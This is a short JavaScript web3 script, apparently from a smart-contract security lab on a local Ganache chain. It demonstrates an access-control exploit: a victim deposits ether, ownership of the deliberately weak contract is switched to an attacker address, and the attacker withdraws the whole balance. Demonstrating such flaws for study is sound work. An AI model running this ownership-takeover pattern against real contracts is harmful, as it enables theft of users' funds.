const { Web3 } = require('web3'); //Import web3 library

//connection to Ganache
const web3 = new Web3('http://localhost:7545'); 

//contract addresses (i will update as deployed), with artifacts (ABI, bytecode, etc,.)
const WeakAccessAddress = '0xEb678eAb2632E0F5f604CA0A07B276e235A3123A';
const WeakAccessArtifact = require('../build/contracts/WeakAccessControl.json');
//const WeakAccessSecureArtifact = require('../build/contracts/WeakAccessControlSecure.json');
const WAccessContract = new web3.eth.Contract(WeakAccessArtifact.abi, WeakAccessAddress);
//const WAccessContract = new web3.eth.Contract(WeakAccessSecureArtifact.abi, WeakAccessAddress); 

//addresses of attack participants with deposit amount
const attackerAddress = '0x9bF6D83C8DA80ce1430fB78579Bf386Baa570188';
const victimAddress = '0x654f54f80eabbDa4A08F3F30d7355dEA149E4d44';
const amountToDeposit = web3.utils.toWei('5', 'ether');

async function attack() {
    console.log('Victim is depositing Ether');
    await WAccessContract.methods.deposit().send({
      from: victimAddress,
      value: amountToDeposit
    });

    console.log(`Victim deposited ${web3.utils.fromWei(amountToDeposit, 'ether')} ETH`);
    console.log('Conmtract ownership i sbeing transferred to the attacker');

    await WAccessContract.methods.switchOwner(attackerAddress).send({ from: victimAddress }); //switching owner
    console.log('Ownership transferred successfully');
    console.log('Withdrawing all ether to attacker address');

    await WAccessContract.methods.withdrawOwner().send({ from: attackerAddress }); //withdrawing the funds after gaining ownership
    console.log('Withdrew all ether using the attacker\'s address');
    let contractBalanceAfter;

    try {
      contractBalanceAfter = await web3.eth.getBalance(WeakAccessAddress);
      console.log(`Contract balance after withdrawal: ${web3.utils.fromWei(contractBalanceAfter, 'ether')} ETH`);

    } catch (error) {
      console.error('Error fetching contract balance after withdrawal:', error);
      return;
    }
    }

attack().catch(console.error);